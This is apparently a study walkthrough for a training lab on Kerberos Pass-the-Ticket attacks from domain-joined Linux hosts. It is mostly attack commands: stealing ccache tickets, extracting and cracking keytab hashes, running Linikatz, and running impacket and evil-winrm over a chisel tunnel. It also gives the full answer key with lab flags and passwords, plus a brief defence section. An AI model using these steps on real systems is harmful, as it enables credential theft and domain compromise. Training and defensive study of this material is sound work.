# Pass the Ticket (PtT) from Linux

## 🎯 Overview

**Pass the Ticket from Linux** extends Kerberos abuse techniques to Linux environments integrated with Active Directory. Unlike Windows-only attacks, Linux machines can also participate in AD domains and store Kerberos tickets that can be stolen and abused for lateral movement.

### Key Concepts
- **Linux AD Integration** - Domain-joined Linux machines using SSSD, Winbind, or similar
- **ccache Files** - Credential cache files storing Kerberos tickets (usually in `/tmp`)
- **Keytab Files** - Files containing Kerberos principals and encrypted keys for authentication
- **Cross-Platform Attacks** - Using Linux tools to attack Windows AD infrastructure

---

## 🐧 Linux Active Directory Integration

### Common Integration Methods
```bash
# Authentication services
✅ SSSD (System Security Services Daemon)
✅ Winbind (Samba component)  
✅ FreeIPA with AD trust
✅ Direct Kerberos configuration
```

### Identifying Domain-Joined Linux Machines

#### Method 1: Using realm command
```bash
# Check if machine is domain-joined
realm list

# Expected output for domain-joined machine:
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

#### Method 2: Process inspection
```bash
# Look for domain integration services
ps -ef | grep -i "winbind\|sssd"

# Expected output:
root   2140    1  0 Sep29 ?   00:00:01 /usr/sbin/sssd -i --logger=files
root   2141 2140  0 Sep29 ?   00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb
root   2142 2140  0 Sep29 ?   00:00:03 /usr/libexec/sssd/sssd_nss
root   2143 2140  0 Sep29 ?   00:00:03 /usr/libexec/sssd/sssd_pam
```

#### Method 3: Configuration files
```bash
# Check for Kerberos configuration
cat /etc/krb5.conf

# Check for SSSD configuration
cat /etc/sssd/sssd.conf

# Check for Samba/Winbind configuration  
cat /etc/samba/smb.conf
```

---

## 🔑 Keytab Files

### What are Keytab Files?
**Keytab files** contain pairs of Kerberos principals and encrypted keys, allowing authentication without interactive password entry. They're commonly used for:
- **Automated scripts** requiring Kerberos authentication
- **Service accounts** for unattended access
- **Computer accounts** for domain communication

### Finding Keytab Files

#### Search by filename pattern
```bash
# Find files with 'keytab' in name
find / -name "*keytab*" -ls 2>/dev/null

# Common locations:
/etc/krb5.keytab                    # Default computer account keytab
/opt/specialfiles/carlos.keytab     # Custom user keytab
/home/user/.scripts/service.kt      # Script-specific keytab
```

#### Search in automated scripts
```bash
# Check crontabs for keytab usage
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Look for kinit commands in scripts
grep -r "kinit" /home/ 2>/dev/null
grep -r "\.kt" /home/ 2>/dev/null
grep -r "\.keytab" /home/ 2>/dev/null
```

### Keytab File Analysis

#### Reading keytab information
```bash
# List principals in keytab file
klist -k -t /opt/specialfiles/carlos.keytab

# Output example:
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ----------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

#### Using keytab for authentication
```bash
# Check current tickets
klist

# Import keytab (case-sensitive!)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify new ticket
klist

# Test access to SMB share
smbclient //dc01/carlos -k -c ls
```

### Extracting Secrets from Keytab Files

#### KeyTabExtract Tool
```bash
# Download and use KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Expected output:
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

#### Hash Cracking
```bash
# Crack NTLM hash with hashcat
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt

# Quick online lookup
# Use services like crackstation.net for common passwords

# Login with cracked password
su - carlos@inlanefreight.htb
```

---

## 💾 ccache Files (Credential Cache)

### Understanding ccache Files
**ccache files** are temporary credential caches that store active Kerberos tickets. They remain valid during user sessions and are automatically created upon domain authentication.

### Finding ccache Files

#### Environment variable check
```bash
# Check current user's ccache location
env | grep -i krb5
echo $KRB5CCNAME

# Example output:
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

#### Search /tmp directory
```bash
# List all ccache files
ls -la /tmp/krb5cc_*

# Example output:
-rw------- 1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw------- 1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d  
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

### Abusing ccache Files

#### Root privilege requirement
```bash
# ccache files are protected by permissions
# Need root access to read other users' ccache files

sudo su
# OR use privilege escalation technique
```

#### Importing ccache files
```bash
# Copy target ccache file
cp /tmp/krb5cc_647401106_HRJDux /root/julio_ticket

# Set environment variable
export KRB5CCNAME=/root/julio_ticket

# Verify ticket import
klist

# Test access with imported ticket
smbclient //dc01/C$ -k -c ls -no-pass
```

---

## 🛠️ Essential Linux Kerberos Tools

### kinit - Request tickets
```bash
# Request TGT for user
kinit username@DOMAIN.HTB

# Use keytab file
kinit username@DOMAIN.HTB -k -t /path/to/file.keytab

# Request renewable ticket
kinit -r 7d username@DOMAIN.HTB
```

### klist - List tickets
```bash
# Show current tickets
klist

# Show keytab file contents
klist -k -t /path/to/file.keytab

# Verbose output
klist -v
```

### kdestroy - Remove tickets
```bash
# Destroy current ticket cache
kdestroy

# Destroy specific cache file
kdestroy -c /path/to/ccache/file
```

---

## 🌐 Using Linux Attack Tools with Kerberos

### Requirements for Remote Attacks
1. **Network connectivity** to KDC/Domain Controller
2. **DNS resolution** for domain names  
3. **Proper /etc/hosts** entries if DNS unavailable
4. **Proxychains setup** if attacking through pivot

### Setting up Attack Environment

#### /etc/hosts configuration
```bash
# Add domain controller entries
cat >> /etc/hosts << EOF
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
EOF
```

#### Proxychains configuration
```bash
# Configure proxychains for SOCKS5
cat > /etc/proxychains.conf << EOF
[ProxyList]
socks5 127.0.0.1 1080
EOF
```

#### Chisel tunnel setup
```bash
# On attack host - start chisel server
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse

# On Windows machine (MS01) - connect client
c:\tools\chisel.exe client ATTACK_HOST_IP:8080 R:socks
```

### Impacket with Kerberos

#### Basic usage
```bash
# Set ccache file environment variable
export KRB5CCNAME=/path/to/ccache/file

# Use target hostname (not IP) with -k flag
proxychains impacket-wmiexec dc01 -k
proxychains impacket-psexec dc01 -k  
proxychains impacket-smbexec dc01 -k
proxychains impacket-secretsdump dc01 -k
```

#### Example session
```bash
proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
inlanefreight\julio
```

### Evil-WinRM with Kerberos

#### Prerequisites installation
```bash
# Install Kerberos package
sudo apt-get install krb5-user -y

# During installation, set:
# Default realm: INLANEFREIGHT.HTB
# KDC: dc01.inlanefreight.htb
```

#### Configuration file
```bash
# Edit /etc/krb5.conf
cat > /etc/krb5.conf << EOF
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
EOF
```

#### Usage example
```bash
# Set ccache environment variable
export KRB5CCNAME=/path/to/ccache/file

# Connect using Kerberos authentication
proxychains evil-winrm -i dc01 -r inlanefreight.htb

*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

---

## 🔄 Ticket Conversion (ccache ↔ kirbi)

### impacket-ticketConverter

#### ccache to kirbi (Linux → Windows)
```bash
# Convert ccache file to kirbi format
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Output: julio.kirbi file for Windows use
```

#### kirbi to ccache (Windows → Linux)  
```bash
# Convert kirbi file to ccache format
impacket-ticketConverter julio.kirbi julio.ccache

# Set environment variable
export KRB5CCNAME=/path/to/julio.ccache
```

#### Using converted tickets

**On Windows:**
```cmd
# Import converted kirbi with Rubeus
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

# Verify import
klist

# Test access
dir \\dc01\julio
```

**On Linux:**
```bash
# Use converted ccache
export KRB5CCNAME=/path/to/converted.ccache
klist
smbclient //dc01/julio -k -c ls
```

---

## 🔍 Advanced Tool: Linikatz

### Overview
**Linikatz** is a Linux equivalent of Mimikatz, designed to extract credentials from various Linux AD integration systems including FreeIPA, SSSD, Samba, and Vintella.

### Installation and usage
```bash
# Download Linikatz
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh

# Run as root (required)
sudo ./linikatz.sh
```

### What Linikatz extracts
- **Kerberos tickets** from multiple implementations
- **Cached credentials** from SSSD
- **Machine secrets** from Samba
- **Various ticket formats** (ccache, keytab)

### Example output
```bash
I: [sss-check] SSS AD configuration
I: [kerberos-check] Kerberos configuration  
I: [check] Machine Kerberos tickets
I: [kerberos-check] User Kerberos tickets

Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

# Results saved in linikatz.* folder
```

---

## 🎯 HTB Academy Lab Exercises

### Lab Environment
- **Target**: Linux machine accessible via SSH port 2222
- **Initial Access**: david@inlanefreight.htb : Password2
- **Connection**: `ssh david@inlanefreight.htb@TARGET_IP -p 2222`

### Exercise 1: Initial Access
**Question**: "Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory."

```bash
# Connect via SSH
ssh david@inlanefreight.htb@TARGET_IP -p 2222

# Read flag
cat ~/flag.txt
```

### Exercise 2: Group Identification
**Question**: "Which group can connect to LINUX01?"

```bash
# Check domain configuration
realm list

# Look for permitted-groups line:
permitted-groups: Linux Admins
```

**Answer**: Linux Admins

### Exercise 3: Keytab Discovery
**Question**: "Look for a keytab file that you have read and write access. Submit the file name as a response."

```bash
# Search for keytab files
find / -name "*keytab*" -ls 2>/dev/null

# Check permissions - look for rw access
ls -la /opt/specialfiles/carlos.keytab

# Expected: -rw-rw-rw- (world writable)
```

**Answer**: carlos.keytab

### Exercise 4: Keytab Hash Extraction
**Question**: "Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory."

```bash
# Extract hashes with KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Note the NTLM hash: a738f92b3c08b424ec2d99589a9cce60

# Crack hash (or use crackstation.net)
# Result: Password5

# Login as carlos
su - carlos@inlanefreight.htb
# Password: Password5

# Read flag
cat ~/flag.txt
```

### Exercise 5: Service Account Discovery  
**Question**: "Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory."

```bash
# Check Carlos' crontab
crontab -l

# Output shows cron job:
# */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

# Navigate to scripts directory
cd /home/carlos@inlanefreight.htb/.scripts/
ls -la

# Files found:
# -rw------- john.keytab
# -rwx------ kerberos_script_test.sh  
# -rw------- svc_workstations._all.kt
# -rw------- svc_workstations.kt

# Extract hash from svc_workstations._all.kt (not .kt!)
python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt

# Result: NTLM HASH: 7247e8d4387e76996ff3f18a34316fdd
# Crack at crackstation.net: Password4

# SSH as svc_workstations
ssh svc_workstations@inlanefreight.htb@TARGET_IP -p 2222
# Password: Password4

# Read flag
cat ~/flag.txt
```

**Answer**: Password4 → SSH access → flag in home directory

### Exercise 6: Privilege Escalation
**Question**: "Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response."

```bash
# Check sudo privileges
sudo -l

# Expected output: (ALL) ALL

# Escalate to root
sudo su

# Read root flag
cat /root/flag.txt
```

**Answer**: Ro0t_Pwn_K3yT4b

### Exercise 7: ccache File Abuse
**Question**: "Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio."

```bash
# Find Julio's ccache files
ls -la /tmp | grep krb5

# Expected output (multiple files):
# -rw------- julio@inlanefreight.htb domain users@inlanefreight.htb krb5cc_647401106_9JBodG
# -rw------- julio@inlanefreight.htb domain users@inlanefreight.htb krb5cc_647401106_HRJDux

# Copy and import julio's ticket (choose non-expired one)
cp /tmp/krb5cc_647401106_9JBodG .
export KRB5CCNAME=/root/krb5cc_647401106_9JBodG

# Verify ticket
klist

# Access julio's share and get file
smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
cat julio.txt
```

**Answer**: JuL1()_SH@re_fl@g

### Exercise 8: Computer Account Ticket
**Question**: "Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_)."

```bash
# Create working directory
mkdir final_flag
cd final_flag/

# Use computer account keytab (note the quotes!)
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab

# Verify computer account ticket
klist

# Access computer share
smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
cat flag.txt
```

**Answer**: Us1nG_KeyTab_Like_@_PRO

### Key Lab Details

#### Exact File Locations
```bash
# Keytab files found
/etc/krb5.keytab                    # Computer account (LINUX01$)
/opt/specialfiles/carlos.keytab     # Carlos user (rw-rw-rw permissions)

# Carlos scripts directory  
/home/carlos@inlanefreight.htb/.scripts/
├── john.keytab
├── kerberos_script_test.sh
├── svc_workstations._all.kt        # Main keytab (use this one!)
└── svc_workstations.kt             # Alternative keytab
```

#### Hash Values and Passwords
```bash
# Carlos keytab
NTLM HASH: a738f92b3c08b424ec2d99589a9cce60
Password: Password5

# svc_workstations keytab  
NTLM HASH: 7247e8d4387e76996ff3f18a34316fdd
Password: Password4
```

#### ccache File Patterns
```bash
# Julio's tickets (multiple files)
krb5cc_647401106_9JBodG    # Active ticket
krb5cc_647401106_HRJDux    # Alternative ticket

# svc_workstations ticket
krb5cc_647401109_JKXJ8V

# Carlos ticket
krb5cc_647402606
```

#### Computer Account Authentication
```bash
# Critical syntax - quotes are required!
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab

# Without quotes may fail
kinit LINUX01$@INLANEFREIGHT.HTB -k -t /etc/krb5.keytab
```

#### Flag Answers Summary
1. **Exercise 1**: Flag in david's home directory
2. **Exercise 2**: Linux Admins  
3. **Exercise 3**: carlos.keytab
4. **Exercise 4**: C@rl0s_1$_H3r3
5. **Exercise 5**: Flag in svc_workstations home
6. **Exercise 6**: Ro0t_Pwn_K3yT4b
7. **Exercise 7**: JuL1()_SH@re_fl@g
8. **Exercise 8**: Us1nG_KeyTab_Like_@_PRO

### Success Validation
```bash
# Verify each step works
1. SSH connections successful
2. realm list shows permitted groups  
3. find command locates carlos.keytab
4. KeyTabExtract produces correct hashes
5. Hash cracking yields valid passwords
6. sudo privileges allow root escalation
7. ccache import enables SMB access
8. Computer account accesses computer share
```

### Optional Exercises

#### Proxychains + Evil-WinRM Setup
```bash
# Transfer ccache to attack host
scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/

# Setup chisel tunnel and proxychains
# Use evil-winrm with Kerberos to connect to DC01
```

#### Cross-Platform Ticket Conversion
```bash
# Export from Windows with Mimikatz/Rubeus
# Convert kirbi to ccache with impacket-ticketConverter
# Use from Linux for C$ drive access
```

---

## 🛡️ Detection and Defense

### Detection Indicators
```bash
# Monitor for suspicious activities
- Unusual kinit usage patterns
- Multiple ccache file access by same user
- Keytab file creation/modification
- Cross-platform authentication patterns
- Kerberos tickets used outside normal hours
```

### Defensive Measures
```bash
# System hardening
✅ Restrict keytab file permissions (600 or 640)
✅ Monitor /tmp directory for ccache abuse
✅ Implement proper sudo policies
✅ Regular rotation of service account passwords
✅ Audit crontab entries for keytab usage

# Monitoring
✅ Log kinit/klist command usage
✅ Monitor Kerberos authentication patterns
✅ Track unusual SSH connections
✅ Alert on root privilege escalations
```

---

## 🔗 Related Techniques

### Attack Chain Summary
```bash
1. Initial Access (SSH/RDP) → Linux machine discovery
2. Domain Integration Check → realm list, ps aux
3. Keytab Discovery → find, crontab analysis  
4. Hash Extraction → KeyTabExtract, cracking
5. Lateral Movement → kinit, ccache abuse
6. Privilege Escalation → sudo, root access
7. Cross-Platform → ticket conversion, Windows attacks
```

### Tool Comparison
| Tool | Purpose | Requirements | Output Format |
|------|---------|--------------|---------------|
| **kinit** | Request tickets | Valid credentials | ccache |
| **klist** | List tickets | Read access | Text output |
| **KeyTabExtract** | Extract hashes | Keytab file | NTLM/AES hashes |
| **Linikatz** | Full extraction | Root access | Multiple formats |
| **impacket-ticketConverter** | Convert tickets | Ticket file | ccache/kirbi |

---

## 📚 References

- **HTB Academy**: Password Attacks - Pass the Ticket from Linux
- **KeyTabExtract**: Tool for extracting secrets from keytab files
- **Linikatz**: Linux credential extraction tool by Cisco
- **Impacket**: Python library for network protocol attacks
- **Evil-WinRM**: PowerShell remoting tool with Kerberos support 